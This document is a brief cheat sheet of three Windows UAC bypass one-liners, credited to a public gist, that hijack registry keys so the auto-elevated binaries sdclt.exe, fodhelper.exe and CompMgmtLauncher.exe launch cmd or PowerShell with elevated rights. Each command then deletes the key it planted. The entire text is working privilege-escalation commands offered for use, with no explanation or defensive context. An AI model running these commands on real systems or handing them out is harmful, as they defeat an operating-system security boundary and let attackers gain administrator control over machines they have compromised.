REM Credits to https://gist.github.com/xillwillx/39e5cccc846d5b5a475bbad48216a5a7

**UAC bypass for Win10:**
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /d "cmd.exe" /f && START /W sdclt.exe && reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /f

**UAC bypass for Win10:**
reg add HKCU\Software\Classes\ms-settings\shell\open\command /v "DelegateExecute" /f && reg add HKCU\Software\Classes\ms-settings\shell\open\command /d "cmd /c start powershell.exe" /f && START /W fodhelper.exe && reg delete HKCU\Software\Classes\ms-settings /f

**UAC bypass for 7/8/10:**
reg add HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command /d "cmd.exe" /f && START /W CompMgmtLauncher.exe && reg delete HKEY_CURRENT_USER\Software\Classes\mscfile /f
